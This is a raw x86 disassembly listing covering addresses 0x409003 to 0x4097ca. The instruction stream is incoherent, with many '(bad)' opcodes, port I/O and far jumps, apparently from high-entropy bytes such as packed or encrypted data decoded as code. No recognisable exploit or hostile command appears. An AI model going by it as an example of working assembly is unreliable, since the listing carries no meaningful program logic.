  409003:	sar    DWORD PTR [edi+edx*2+0x62],cl
  409007:	mov    ds:0xfd2a40a5,al
  40900c:	jne    0x408f97
  40900e:	gs sbb dl,bh
  409011:	cld    
  409012:	js     0x409023
  409014:	xadd   BYTE PTR ds:0x482477a5,ch
  40901b:	stos   BYTE PTR es:[edi],al
  40901c:	in     al,0x59
  40901e:	and    BYTE PTR [esi],0x27
  409021:	outs   dx,BYTE PTR ds:[esi]
  409022:	out    dx,eax
  409023:	push   ds
  409024:	jmp    0x784e9625
  409029:	(bad)  
  40902a:	ins    BYTE PTR es:[edi],dx
  40902b:	fiadd  WORD PTR [ebp+ebp*4+0x19]
  40902f:	mov    eax,0xc974ee00
  409034:	ss inc edx
  409036:	mov    eax,ds:0xc5d1fb14
  40903b:	(bad)  
  40903d:	aam    0x78
  40903f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409040:	(bad)  [ebx-0x37acd7fc]
  409046:	hlt    
  409047:	fild   WORD PTR ss:0x2a5b6586
  40904e:	in     eax,0xf2
  409050:	push   ds
  409051:	pop    ebp
  409052:	xor    BYTE PTR [esi-0x58cb1897],bl
  409058:	xor    eax,0xec974780
  40905d:	inc    edx
  40905e:	(bad)  
  40905f:	cmc    
  409060:	sub    esp,DWORD PTR ds:0x164c7fc0
  409066:	sub    eax,0xf5671b30
  40906b:	cdq    
  40906c:	push   edi
  40906d:	mov    ebp,0xcacd4a49
  409072:	mov    eax,ds:0x6b858ee3
  409077:	scas   al,BYTE PTR es:[edi]
  409078:	xchg   edx,eax
  409079:	lock fisttp QWORD PTR [eax-0x2b]
  40907d:	push   cs
  40907e:	out    dx,eax
  40907f:	mov    eax,0x59198686
  409084:	add    DWORD PTR [eax+0x15],eax
  409087:	jnp    0x4090cf
  409089:	or     eax,0x93f30202
  40908e:	pop    ebp
  40908f:	adc    BYTE PTR [edi+0x77],0x79
  409093:	retf   0x3053
  409096:	fidiv  DWORD PTR [ecx]
  409098:	sub    al,0x7a
  40909a:	or     BYTE PTR [ebx-0x28],ch
  40909d:	dec    ebp
  40909e:	dec    edx
  40909f:	dec    edx
  4090a0:	scas   eax,DWORD PTR es:[edi]
  4090a1:	ins    DWORD PTR es:[edi],dx
  4090a2:	xchg   ebp,eax
  4090a3:	and    BYTE PTR [edi],al
  4090a5:	jo     0x4090f5
  4090a7:	jb     0x409034
  4090a9:	into   
  4090aa:	mov    bh,0x9
  4090ac:	xlat   BYTE PTR ds:[ebx]
  4090ad:	in     eax,dx
  4090ae:	fst    st(5)
  4090b0:	jmp    FWORD PTR [eax+0x315abdc5]
  4090b6:	(bad)  
  4090b7:	nop
  4090b8:	or     ebp,DWORD PTR [esi-0x18faacaa]
  4090be:	jbe    0x4090ba
  4090c0:	das    
  4090c1:	inc    eax
  4090c2:	pop    ss
  4090c3:	push   edi
  4090c4:	and    eax,0x9d9eac38
  4090c9:	pop    ss
  4090ca:	xchg   DWORD PTR cs:[eax-0x67],edx
  4090ce:	push   esi
  4090cf:	out    0xcd,eax
  4090d1:	mov    WORD PTR [esi+0x69edae29],fs
  4090d7:	fnsave [edi+0x4]
  4090da:	pop    ebp
  4090db:	xor    eax,0xa63d4c3e
  4090e0:	test   al,0xef
  4090e2:	jmp    0x4090d9
  4090e4:	sbb    al,0xe3
  4090e6:	int    0xe1
  4090e8:	mov    cs,WORD PTR [ebx]
  4090ea:	icebp  
  4090eb:	loop   0x409148
  4090ed:	(bad)  
  4090ee:	std    
  4090ef:	xor    BYTE PTR [edx+0x5a4bef1d],bh
  4090f5:	out    0xbf,eax
  4090f7:	push   cs
  4090f8:	scas   al,BYTE PTR es:[edi]
  4090f9:	jg     0x40917a
  4090fb:	adc    al,0xfa
  4090fd:	jne    0x4090cb
  4090ff:	imul   ebx,DWORD PTR [esi+0x3c],0xe493f204
  409106:	sbb    cl,bl
  409108:	nop
  409109:	popa   
  40910a:	push   0xfffffffa
  40910c:	xor    eax,0xb477151
  409111:	outs   dx,BYTE PTR gs:[esi]
  409113:	mov    ds:0x2f642e17,eax
  409118:	pusha  
  409119:	pop    ecx
  40911a:	adc    BYTE PTR [esi],cl
  40911c:	daa    
  40911d:	mov    BYTE PTR [ebp+0x1b],bl
  409120:	pop    edx
  409121:	mov    esp,0xdcdc4d7a
  409126:	add    bl,BYTE PTR [ecx+0x267143bb]
  40912c:	shl    BYTE PTR [edi+0x50],0xe5
  409130:	out    dx,eax
  409131:	push   ds
  409132:	aaa    
  409133:	or     edx,ebp
  409135:	pop    es
  409136:	dec    edx
  409137:	ror    BYTE PTR ds:0xc1dc760f,cl
  40913d:	repz sub bh,cl
  409140:	dec    esp
  409141:	mov    al,BYTE PTR [edx+edi*8+0x74ec4a83]
  409148:	add    esp,DWORD PTR [ecx+0x14ba93e0]
  40914e:	fs scas eax,DWORD PTR es:[edi]
  409150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409152:	adc    BYTE PTR [ecx-0x76764ffb],dh
  409158:	xchg   ebp,eax
  409159:	shl    DWORD PTR [ebx],0xec
  40915c:	fcmovb st,st(0)
  40915e:	or     eax,0x77de31b1
  409163:	mov    BYTE PTR ds:0x31b27444,bh
  409169:	fcmovne st,st(7)
  40916b:	push   esi
  40916c:	push   esp
  40916d:	xor    DWORD PTR [edx-0x263c4532],edi
  409173:	sub    cl,BYTE PTR [ecx-0x524b1fbc]
  409179:	dec    edi
  40917a:	or     edi,ebx
  40917c:	(bad)  
  40917d:	jmp    DWORD PTR [ebx-0x4259e283]
  409183:	test   BYTE PTR [ebp-0x4e],ah
  409186:	pop    edx
  409187:	sbb    cl,BYTE PTR [eax-0x5c]
  40918a:	arpl   WORD PTR [ebp-0x40],bp
  40918d:	xchg   edi,eax
  40918e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40918f:	cmp    al,0x86
  409191:	pop    esi
  409192:	lods   al,BYTE PTR ds:[esi]
  409193:	mov    cl,BYTE PTR [eax]
  409195:	clc    
  409196:	not    cl
  409198:	mov    WORD PTR [ebp-0x6208712e],cs
  40919e:	fisub  DWORD PTR [edi]
  4091a0:	sahf   
  4091a1:	adc    al,0x42
  4091a3:	xor    BYTE PTR [edx-0x2f],cl
  4091a6:	not    ecx
  4091a8:	popf   
  4091a9:	and    BYTE PTR [ecx-0xf],bh
  4091ac:	xchg   edx,eax
  4091ad:	pop    ecx
  4091ae:	je     0x409150
  4091b0:	push   ebp
  4091b1:	out    dx,eax
  4091b2:	mov    ds:0x104fb23e,eax
  4091b7:	sub    DWORD PTR [ebx+0xf1cc9e4],edi
  4091bd:	cmp    BYTE PTR [edi-0x36],ch
  4091c0:	jmp    0x40914e
  4091c2:	mov    esi,0x166879ad
  4091c7:	cdq    
  4091c8:	mov    bh,0x6
  4091ca:	shl    ch,1
  4091cc:	adc    eax,0xe9716897
  4091d1:	fimul  DWORD PTR [edi+ebx*4]
  4091d4:	or     ebp,DWORD PTR [eax+0x78]
  4091d7:	mov    cs,WORD PTR [edx+esi*4+0x4b05532a]
  4091de:	in     eax,0x1e
  4091e0:	push   ecx
  4091e1:	xchg   BYTE PTR [esp+ebx*1-0x456cc2d9],cl
  4091e8:	ret    
  4091e9:	(bad)  
  4091ea:	enter  0x7158,0xa8
  4091ee:	out    0x9b,eax
  4091f0:	inc    eax
  4091f1:	lock inc ecx
  4091f3:	(bad)  
  4091f4:	dec    ebx
  4091f5:	sbb    cl,al
  4091f7:	lock add BYTE PTR [esi],ah
  4091fa:	call   0x4ddd:0x574dc7e1
  409201:	bound  ecx,QWORD PTR [edx+0x2ebea603]
  409207:	dec    eax
  409208:	cld    
  409209:	jbe    0x409262
  40920b:	pextrw edx,(bad),0xc5
  40920d:	push   edi
  40920e:	pop    edi
  40920f:	(bad)  
  409210:	jmp    0x40921d
  409212:	das    
  409213:	xchg   ebp,eax
  409214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409215:	out    dx,al
  409216:	jp     0x409295
  409218:	adc    BYTE PTR [eax],bh
  40921a:	xchg   esi,eax
  40921b:	and    DWORD PTR [eax-0x7c],0x4c
  40921f:	enter  0xf529,0x8d
  409223:	imul   ecx,edi,0xffffffd8
  409226:	jecxz  0x409205
  409228:	jo     0x409244
  40922a:	ins    DWORD PTR es:[edi],dx
  40922b:	cdq    
  40922c:	push   esp
  40922d:	inc    ebx
  40922e:	ss stos BYTE PTR es:[edi],al
  409230:	(bad)  [edx-0x15]
  409233:	cmp    BYTE PTR [edi-0x3f],0xb9
  409237:	call   0x2a49:0xd56dfa78
  40923e:	pop    esi
  40923f:	outs   dx,BYTE PTR ds:[esi]
  409240:	xchg   ecx,eax
  409241:	cld    
  409242:	push   eax
  409243:	mov    ebx,0x87983e90
  409248:	mov    al,ds:0x3eefceed
  40924d:	fidivr DWORD PTR [esi]
  40924f:	xchg   ecx,eax
  409250:	shl    DWORD PTR [ecx+0x72b7df36],1
  409256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409257:	or     esp,DWORD PTR [edx-0x4b382dae]
  40925d:	add    BYTE PTR [ebx+edi*1],0x80
  409261:	shl    BYTE PTR [ebp-0x57],0x67
  409265:	xor    cl,BYTE PTR [ebx+0x22]
  409268:	push   edi
  409269:	sbb    ebp,DWORD PTR [edi+esi*4]
  40926c:	mov    BYTE PTR [ebp-0x34],ch
  40926f:	jo     0x40929a
  409271:	out    0x6,eax
  409273:	(bad)  
  409274:	hlt    
  409275:	xchg   esi,eax
  409276:	fadd   DWORD PTR [esi+0x40343c7]
  40927c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40927d:	dec    eax
  40927e:	inc    esi
  40927f:	mov    ds:0xce444f2c,al
  409284:	mov    ebp,0xd2009cff
  409289:	push   ecx
  40928a:	dec    ebp
  40928b:	pop    ds
  40928c:	jp     0x409277
  40928e:	hlt    
  40928f:	aad    0x2d
  409291:	fisttp WORD PTR [ecx]
  409293:	sub    BYTE PTR [ebp-0x1a110b35],0xb4
  40929a:	push   ds
  40929b:	cmp    eax,0x39965006
  4092a0:	loop   0x4092ac
  4092a2:	xor    BYTE PTR [edx-0x38],dl
  4092a5:	push   ds
  4092a6:	lods   eax,DWORD PTR ds:[esi]
  4092a7:	in     al,0x6f
  4092a9:	loopne 0x409279
  4092ab:	pushf  
  4092ac:	sub    al,0xd3
  4092ae:	or     DWORD PTR [esi+0x22d5feee],ecx
  4092b4:	push   0x8f2c46ce
  4092b9:	ror    BYTE PTR [ebx],cl
  4092bb:	xor    eax,0x4de71df9
  4092c0:	mov    dh,0x6f
  4092c2:	dec    esi
  4092c3:	(bad)  
  4092c4:	pushf  
  4092c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092c6:	cld    
  4092c7:	mov    bl,cl
  4092c9:	sub    bl,BYTE PTR [eax-0x103eda98]
  4092cf:	cwde   
  4092d0:	and    al,0xdf
  4092d2:	mov    eax,0xc90387de
  4092d7:	test   eax,0x72489e07
  4092dc:	lds    esi,FWORD PTR [edx+ebx*1]
  4092df:	push   esp
  4092e0:	sbb    ah,BYTE PTR [bx+di-0x46b8]
  4092e5:	jl     0x40926b
  4092e7:	movq   QWORD PTR [ebp-0x4d235dfc],mm1
  4092ee:	test   BYTE PTR [ebp+esi*8-0x6],al
  4092f2:	xchg   BYTE PTR [ebx+0x30],dh
  4092f5:	mov    ch,0xb2
  4092f7:	mov    ch,0x95
  4092f9:	or     ecx,eax
  4092fb:	adc    eax,0x8ba42311
  409300:	dec    edx
  409301:	mov    bl,0x6e
  409303:	pop    ebx
  409304:	dec    ecx
  409305:	ins    BYTE PTR es:[edi],dx
  409306:	xor    al,0xc1
  409308:	pop    ebp
  409309:	ins    DWORD PTR es:[edi],dx
  40930a:	inc    ecx
  40930b:	outs   dx,BYTE PTR ds:[esi]
  40930c:	test   BYTE PTR [esi+0x40e96b49],al
  409312:	in     eax,0xbd
  409314:	mov    ebx,0xf11500de
  409319:	push   edi
  40931a:	scas   eax,DWORD PTR es:[edi]
  40931b:	leave  
  40931c:	sub    eax,0x43c935
  409321:	or     DWORD PTR [esi+0x1f378561],ebx
  409327:	dec    ecx
  409328:	pushf  
  409329:	dec    ebp
  40932a:	dec    BYTE PTR ds:0xfb317def
  409330:	sti    
  409331:	pushf  
  409332:	(bad)  
  409333:	pop    ecx
  409334:	dec    ebp
  409335:	adc    BYTE PTR gs:0xb7256ba,dl
  40933c:	gs jmp 0x41c6332d
  409342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409343:	push   ebx
  409344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409345:	(bad)  
  409346:	xchg   esi,eax
  409347:	mov    eax,0x3a90c20c
  40934c:	or     dl,0xb2
  40934f:	fiadd  WORD PTR [ebx-0x6bc52fd1]
  409355:	inc    edx
  409356:	or     eax,0xef77925a
  40935b:	rsqrtps xmm4,XMMWORD PTR [edi-0x46922459]
  409362:	sbb    al,0x8b
  409364:	adc    BYTE PTR [edx],ah
  409366:	mov    eax,ds
  409368:	loope  0x4093db
  40936a:	(bad)  
  40936b:	int    0x33
  40936d:	xor    dl,BYTE PTR [ebx+0x6f4b7fa3]
  409373:	xchg   dx,ax
  409375:	lds    esi,FWORD PTR [edi]
  409377:	daa    
  409378:	std    
  409379:	imul   esi,DWORD PTR [ebx-0x1fad91df],0xffffffbb
  409380:	sbb    al,0x8b
  409382:	jecxz  0x4093e6
  409384:	pop    esi
  409385:	lods   eax,DWORD PTR ds:[esi]
  409386:	pushf  
  409387:	nop
  409388:	pop    edi
  409389:	sbb    DWORD PTR [ebp-0x70],0x6a
  40938d:	clc    
  40938e:	out    0xbe,al
  409390:	mov    dl,0xf8
  409392:	xchg   edi,eax
  409393:	fild   QWORD PTR [ebx]
  409395:	jmp    0x3416:0x20ca55ad
  40939c:	pop    ecx
  40939d:	pop    edi
  40939e:	pop    es
  40939f:	sbb    BYTE PTR ds:0x8535236c,ah
  4093a5:	dec    edi
  4093a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093a7:	fisubr WORD PTR [ecx+edx*4-0x38]
  4093ab:	xrelease mov BYTE PTR [edx+eiz*2-0x1a],dl
  4093b0:	lea    ebx,[edx-0x53]
  4093b3:	int    0xff
  4093b5:	xchg   ebp,eax
  4093b6:	fidivr DWORD PTR [esi-0x6bd6f681]
  4093bc:	jne    0x4093e8
  4093be:	xchg   esp,eax
  4093bf:	les    edi,FWORD PTR [esi-0x72]
  4093c2:	mov    esp,es
  4093c4:	fwait
  4093c5:	adc    BYTE PTR [ebp+0x10b82b30],bl
  4093cb:	jbe    0x4093d2
  4093cd:	je     0x40942d
  4093cf:	push   ss
  4093d0:	push   ds
  4093d1:	lahf   
  4093d2:	push   es
  4093d3:	jbe    0x409402
  4093d5:	push   0x1e0f0f84
  4093da:	lods   al,BYTE PTR ds:[esi]
  4093db:	fild   WORD PTR [ecx+0x4289aa32]
  4093e1:	out    dx,eax
  4093e2:	loope  0x4093bd
  4093e4:	xor    DWORD PTR [edi+0x72fdf5bd],edi
  4093ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093eb:	sub    eax,0x7d32b0
  4093f0:	test   DWORD PTR [edi],edx
  4093f2:	std    
  4093f3:	cmp    DWORD PTR [esi],edx
  4093f5:	or     al,0xd0
  4093f7:	imul   ebx,DWORD PTR [ecx-0x30cb39fa],0x1303d817
  409401:	xor    eax,eax
  409403:	mov    edx,0x86deebe6
  409408:	test   ebp,edx
  40940a:	pop    esp
  40940b:	imul   edx,DWORD PTR [ebx],0x15aeab45
  409411:	cmp    dl,BYTE PTR [ebp+0x13]
  409414:	jl     0x40944d
  409416:	outs   dx,BYTE PTR ds:[esi]
  409417:	mov    bl,0xc5
  409419:	jmp    0x40941c
  40941b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40941c:	sbb    eax,0x471d494
  409421:	rol    DWORD PTR ds:0xe1342ebd,cl
  409427:	call   DWORD PTR [edx-0x1e]
  40942a:	popa   
  40942b:	push   0x29
  40942d:	retf   0x9753
  409430:	inc    ecx
  409431:	clc    
  409432:	push   ebp
  409433:	jb     0x40946f
  409435:	push   ss
  409436:	sbb    al,0x59
  409438:	add    al,0x1f
  40943a:	cmp    al,ah
  40943c:	mov    eax,ds:0x5554a60f
  409441:	or     ecx,DWORD PTR [ebx+0x22239608]
  409447:	call   0xb7bc581d
  40944c:	and    dh,ch
  40944e:	or     eax,0x8cd9a43a
  409453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409454:	sub    al,0xc0
  409456:	jbe    0x4093f3
  409458:	mov    ecx,0xf929f394
  40945d:	xchg   ch,ah
  40945f:	fist   DWORD PTR [edx]
  409461:	xchg   edi,eax
  409462:	dec    ecx
  409463:	mov    bh,BYTE PTR [edi+0x522ad6b]
  409469:	ror    DWORD PTR [ebx+0x15],1
  40946c:	ins    BYTE PTR es:[edi],dx
  40946d:	pop    edx
  40946e:	mov    ebx,0x559c30d4
  409473:	mov    DWORD PTR [esi+0x2dac50ad],0x2455a8
  40947d:	push   es
  40947e:	dec    edx
  40947f:	push   ebx
  409480:	mov    WORD PTR [edx+0x6a04020a],es
  409486:	aas    
  409487:	js     0x40943c
  409489:	(bad)  
  40948a:	pop    ebp
  40948b:	ficomp WORD PTR [ebx]
  40948d:	fnstcw WORD PTR [eax+0xe8c8137]
  409493:	mov    edx,0x3e29962d
  409498:	shl    bl,1
  40949a:	mov    ds:0x8c1b206d,al
  40949f:	xchg   ebx,eax
  4094a0:	push   es
  4094a1:	cmp    esp,edi
  4094a3:	inc    ebx
  4094a4:	ins    DWORD PTR es:[edi],dx
  4094a5:	lahf   
  4094a6:	rcr    BYTE PTR [eax-0x74b73f32],cl
  4094ac:	cmp    edi,DWORD PTR [eax-0x515cfbf3]
  4094b2:	push   esi
  4094b3:	pop    esi
  4094b4:	sti    
  4094b5:	jecxz  0x4094dc
  4094b7:	je     0x4094c1
  4094b9:	ins    BYTE PTR es:[edi],dx
  4094ba:	cmp    al,0x62
  4094bc:	adc    ecx,esp
  4094be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094bf:	xor    al,0x68
  4094c1:	das    
  4094c2:	jmp    0x42f4:0x5aba3fd9
  4094c9:	xor    DWORD PTR [edx-0x7fca725],ecx
  4094cf:	(bad)  
  4094d0:	arpl   WORD PTR [esi],cx
  4094d2:	stc    
  4094d3:	neg    BYTE PTR [edx+0x79]
  4094d6:	push   0x3f
  4094d8:	lds    edx,FWORD PTR [esi-0x7f3d1c62]
  4094de:	inc    ebp
  4094df:	and    edx,ecx
  4094e1:	rcr    BYTE PTR [ecx+eiz*8-0x2c],0xba
  4094e6:	popf   
  4094e7:	and    al,bl
  4094e9:	jmp    0x8056:0x51172daa
  4094f0:	aas    
  4094f1:	lods   al,BYTE PTR ds:[esi]
  4094f2:	js     0x4094d2
  4094f4:	pop    eax
  4094f5:	inc    edx
  4094f6:	int3   
  4094f7:	jmp    0x4ce93149
  4094fc:	std    
  4094fd:	lahf   
  4094fe:	cwde   
  4094ff:	ins    DWORD PTR es:[edi],dx
  409500:	cmp    ebp,edi
  409502:	(bad)  
  409503:	add    cl,BYTE PTR [eax]
  409505:	fwait
  409506:	mov    BYTE PTR [ebx],ch
  409508:	int3   
  409509:	fst    st(1)
  40950b:	inc    edi
  40950c:	and    ebp,eax
  40950e:	aas    
  40950f:	ja     0x4094a7
  409511:	or     al,0xc4
  409513:	mov    ebx,0xa077418a
  409518:	cwde   
  409519:	ror    BYTE PTR [esi],1
  40951b:	dec    edx
  40951c:	loopne 0x409546
  40951e:	fldenv [edx+eiz*8]
  409521:	dec    edx
  409522:	fwait
  409523:	mov    edx,0x57e6dc1f
  409528:	test   bl,dh
  40952a:	add    sp,WORD PTR [edx]
  40952d:	inc    ebp
  40952e:	popa   
  40952f:	cmp    eax,0x4e7b08a7
  409534:	mov    esi,0xe83fd25f
  409539:	xor    DWORD PTR [ecx],ebx
  40953b:	(bad)  
  40953c:	xchg   edi,eax
  40953d:	shl    DWORD PTR [eax*1-0x46fb4269],0x85
  409545:	pop    esp
  409546:	jg     0x409513
  409548:	fbstp  TBYTE PTR [ebx+0x107b03a4]
  40954e:	(bad)  
  40954f:	push   ds
  409550:	xchg   BYTE PTR [ecx+ebx*8+0x9],dl
  409554:	cld    
  409555:	inc    edx
  409556:	lods   al,BYTE PTR ds:[esi]
  409557:	gs jmp 0xdab4419b
  40955d:	or     dl,BYTE PTR [eax+0x188f618]
  409563:	aas    
  409564:	xchg   ecx,eax
  409565:	out    0x0,eax
  409567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409568:	jmp    0xf42e01b1
  40956d:	and    BYTE PTR [ebp-0x51b625f2],bl
  409573:	rcr    BYTE PTR [edi+0xa0ed323],cl
  409579:	fsqrt  
  40957b:	retf   
  40957c:	jbe    0x4095de
  40957e:	jne    0x409559
  409580:	fstp   QWORD PTR [ecx-0x11]
  409583:	mov    ebp,DWORD PTR [ebx]
  409585:	into   
  409586:	and    DWORD PTR ds:[esi],edi
  409589:	ja     0x409557
  40958b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40958c:	mov    bl,0x47
  40958e:	mov    edi,0x7a5f145
  409593:	adc    BYTE PTR [ebx-0x576ff26f],dh
  409599:	ret    0x90f2
  40959c:	mov    es,WORD PTR [esi]
  40959e:	imul   cl
  4095a0:	das    
  4095a1:	dec    edi
  4095a2:	inc    edx
  4095a3:	mov    es,WORD PTR [ebx+0x59]
  4095a6:	cmp    edi,DWORD PTR [ebx-0x2e738800]
  4095ac:	mov    ebp,0x44b6bdd4
  4095b1:	or     BYTE PTR [ecx],cl
  4095b3:	call   0x49d1e089
  4095b8:	out    dx,eax
  4095b9:	mov    dl,0x6a
  4095bb:	adc    al,0x67
  4095bd:	sub    DWORD PTR [esi],esp
  4095bf:	in     al,dx
  4095c0:	and    esp,esp
  4095c2:	aaa    
  4095c3:	retf   0x8f2c
  4095c6:	mov    bl,0x76
  4095c8:	adc    al,0xee
  4095ca:	cmc    
  4095cb:	jl     0x40958e
  4095cd:	loop   0x40957a
  4095cf:	bound  ecx,QWORD PTR [ebx]
  4095d1:	push   esi
  4095d2:	vshufps xmm3,xmm5,XMMWORD PTR [edi],0xb9
  4095d7:	xchg   ebx,eax
  4095d8:	sub    BYTE PTR [esi],ch
  4095da:	cvttps2pi mm2,QWORD PTR [edx+0x1b]
  4095de:	or     BYTE PTR ds:0x999f89cc,ah
  4095e4:	inc    edx
  4095e5:	sbb    DWORD PTR [edi],0x4d
  4095e8:	pop    ebp
  4095e9:	lods   al,BYTE PTR ds:[esi]
  4095ea:	xor    ecx,ebx
  4095ec:	sub    edx,esi
  4095ee:	or     al,0xbe
  4095f0:	push   edi
  4095f1:	adc    BYTE PTR [edx+0x63e058a7],cl
  4095f7:	dec    esp
  4095f8:	jb     0x409631
  4095fa:	out    dx,eax
  4095fb:	hlt    
  4095fc:	mov    esi,0x6bd4d4b0
  409601:	cwde   
  409602:	lods   al,BYTE PTR ds:[esi]
  409603:	jg     0x40967d
  409605:	jecxz  0x409637
  409607:	cmp    al,0xb3
  409609:	gs pushf 
  40960b:	mov    dl,0xe2
  40960d:	fcmovnbe st,st(0)
  40960f:	cmp    DWORD PTR [ecx+0x7c8588d],esp
  409615:	push   eax
  409616:	jg     0x40960c
  409618:	les    edx,FWORD PTR [ecx-0x1fd83200]
  40961e:	rol    DWORD PTR [edi],1
  409620:	rol    edi,cl
  409622:	mov    esi,0xe7f1e875
  409627:	mov    eax,0xa2dc3352
  40962c:	push   es
  40962d:	sar    DWORD PTR [ebx],0xb8
  409630:	imul   edx,esi,0xffffffca
  409633:	jp     0x409614
  409635:	lds    ecx,FWORD PTR [eax-0x6f]
  409638:	mov    ebx,0x5b5dbf8f
  40963d:	aad    0x60
  40963f:	push   ecx
  409640:	enter  0xba47,0x80
  409644:	xchg   ebx,eax
  409645:	not    ecx
  409647:	pop    edx
  409648:	cdq    
  409649:	cmp    eax,DWORD PTR [esi]
  40964b:	pushf  
  40964c:	in     al,dx
  40964d:	ret    0xc41f
  409650:	jne    0x4095d6
  409652:	sub    al,0x36
  409654:	addr16 inc ebx
  409656:	and    DWORD PTR [ebx+0x7e],ebx
  409659:	arpl   WORD PTR [edi],si
  40965b:	jb     0x409609
  40965d:	dec    ebp
  40965e:	jb     0x4096a3
  409660:	mov    al,ds:0x40e2b3f9
  409665:	adc    eax,0x53cb374c
  40966a:	shr    BYTE PTR [esi-0x60f3d3b2],cl
  409670:	mov    ds:0xca5c0de0,al
  409675:	sbb    al,0x66
  409677:	inc    eax
  409678:	sbb    edi,DWORD PTR [ebp+0x15]
  40967b:	mov    ch,0xb1
  40967d:	loope  0x40962f
  40967f:	cmp    al,0x87
  409681:	scas   al,BYTE PTR es:[edi]
  409682:	mov    ch,0xc8
  409684:	pop    edx
  409685:	adc    edx,esi
  409687:	sub    BYTE PTR [ebx+0x5f],0x16
  40968b:	test   DWORD PTR [edi+0x11],edi
  40968e:	pop    ds
  40968f:	sub    al,0xd1
  409691:	nop
  409692:	mov    ah,0x3e
  409694:	arpl   WORD PTR [ebp+eax*1+0x1483be3c],bx
  40969b:	shl    BYTE PTR [eax],cl
  40969d:	cmp    al,0xc0
  40969f:	xor    esi,0xd7d82b83
  4096a5:	inc    esp
  4096a6:	jecxz  0x409700
  4096a8:	(bad)  
  4096a9:	jmp    0x409666
  4096ab:	aad    0x25
  4096ad:	or     al,0xb5
  4096af:	lea    esi,[ebp-0x4e9d73d5]
  4096b5:	push   esp
  4096b6:	loope  0x409638
  4096b8:	sti    
  4096b9:	aam    0x49
  4096bb:	iret   
  4096bc:	clc    
  4096bd:	add    dl,BYTE PTR [ecx+0x4dd8ef1c]
  4096c3:	out    0x32,eax
  4096c5:	into   
  4096c6:	adc    al,0x7a
  4096c8:	or     al,0x85
  4096ca:	and    eax,esi
  4096cc:	jb     0x4096ce
  4096ce:	addr16 cmc 
  4096d0:	mov    bh,0x9b
  4096d2:	les    esi,FWORD PTR [edi]
  4096d4:	shl    DWORD PTR [ebx+0x4f],1
  4096d7:	shl    DWORD PTR [ebx+0x7bbd56df],0xe8
  4096de:	cdq    
  4096df:	fild   DWORD PTR [ecx]
  4096e1:	mov    WORD PTR [esi],fs
  4096e3:	lea    edx,[edi-0x4c9ee57e]
  4096e9:	mov    edi,0xf4f90a8
  4096ee:	xor    bl,BYTE PTR [edx+0x32873aa3]
  4096f4:	push   edx
  4096f5:	dec    esp
  4096f6:	repz xor eax,0x3d93541
  4096fc:	ins    DWORD PTR es:[edi],dx
  4096fd:	dec    edx
  4096fe:	fiadd  WORD PTR [ebp-0x3d]
  409701:	mov    ah,0xa3
  409703:	cmp    ecx,ebx
  409705:	sub    BYTE PTR [eax-0x6c44a201],bh
  40970b:	call   0x73fb83a4
  409710:	add    BYTE PTR [ebx],ah
  409712:	retf   
  409713:	push   eax
  409714:	js     0x4096cd
  409716:	enter  0x75c0,0x99
  40971a:	xor    eax,0x242146e4
  40971f:	pop    ecx
  409720:	loop   0x40974c
  409722:	rol    ebx,cl
  409724:	(bad)  
  409725:	mov    eax,ds:0x9b5784ca
  40972a:	pusha  
  40972b:	jle    0x409730
  40972d:	int    0xe0
  40972f:	mov    esp,eax
  409731:	es pop ebp
  409733:	sbb    eax,0xfe810e6d
  409738:	jo     0x409700
  40973a:	push   esp
  40973b:	mov    ecx,0xe1feee7d
  409740:	and    esp,DWORD PTR [ebp+eiz*8+0x7ef98cca]
  409747:	setae  BYTE PTR [ebp+0x0]
  40974b:	jp     0x4096df
  40974d:	ins    DWORD PTR es:[edi],dx
  40974e:	jns    0x4097b9
  409750:	mul    ah
  409752:	xor    esp,DWORD PTR [ebx+esi*2]
  409755:	cmp    DWORD PTR [esi-0x46ce9fb],esi
  40975b:	sub    ch,BYTE PTR [edi+0x1e]
  40975e:	and    ch,bh
  409760:	push   0xffffffd4
  409762:	xchg   ebp,eax
  409763:	scas   eax,DWORD PTR es:[edi]
  409764:	xchg   esi,eax
  409765:	loope  0x409787
  409767:	not    BYTE PTR [eax]
  409769:	cmp    DWORD PTR [edi],eax
  40976b:	bnd jo 0x4096fe
  40976e:	pop    edi
  40976f:	xchg   DWORD PTR [edx-0x5b3771f9],edx
  409775:	xor    DWORD PTR [ecx+0x4cba7b30],eax
  40977b:	je     0x4097dd
  40977d:	cmp    al,0x93
  40977f:	daa    
  409780:	dec    ebp
  409781:	push   es
  409782:	inc    ecx
  409783:	(bad)
  409786:	pop    ecx
  409787:	imul   eax,edi,0x76834e0d
  40978d:	jnp    0x409723
  40978f:	jno    0x409741
  409791:	ss pop es
  409793:	or     eax,DWORD PTR [esi]
  409795:	push   0x1c7cef12
  40979a:	and    dh,BYTE PTR ds:0xb82edea1
  4097a0:	inc    edi
  4097a1:	add    cl,BYTE PTR [ecx+0x41]
  4097a4:	pop    es
  4097a5:	xor    al,BYTE PTR [eax-0x6d]
  4097a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097a9:	jns    0x409765
  4097ab:	sbb    dl,bl
  4097ad:	ret    
  4097ae:	xchg   edi,eax
  4097af:	sbb    ecx,ebx
  4097b1:	xchg   esi,eax
  4097b2:	sbb    dh,BYTE PTR [esi-0x6b]
  4097b5:	add    BYTE PTR [ebp+eax*2-0x1a],0x40
  4097ba:	mov    dh,0xfb
  4097bc:	and    eax,0x76057faf
  4097c1:	push   eax
  4097c2:	adc    DWORD PTR [edx+0x293b2d5a],edx
  4097c8:	sahf   
  4097c9:	xlat   BYTE PTR ds:[ebx]
  4097ca:	pop    edx
